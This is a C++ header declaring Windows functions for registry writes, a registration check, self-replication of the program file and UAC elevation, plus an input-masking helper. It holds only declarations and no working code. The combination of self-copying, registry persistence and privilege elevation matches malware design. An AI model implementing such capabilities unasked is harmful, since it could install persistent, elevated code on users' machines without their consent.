/*contains functions for winAPI registry operations
 *contains functions for elevating UAC to admin level
 *contains functions for program file self replication
 *contains function for masking user input
 */
#ifndef ADVANCED_HEADER_FILE_H
#define ADVANCED_HEADER_FILE_H

#include <cstdio>
#include <string>
#include <cstring>
#include <cstdlib>
#include <iostream>

#if defined (_WIN32) || (_WIN64)
#include <windows.h>
#include <tchar.h>
#elif defined (__linux__)
#include <sstream>
#endif // defined _WIN32 || _WIN64

namespace kosmaz
{
#if defined (_WIN32) || (_WIN64)
    bool Am_I_Registered(PCWSTR);
    std::string Replicate_Self();
    bool Write_To_Registry();
#endif

    char* hide_user_input();

#if defined (__linux__)
template<typename T> std::string to_string(const T& n)
{
    std::ostringstream stm;
    stm<<n;
    return stm.str();
}
#endif

}

#endif  //ADVANCED_HEADER_FILE
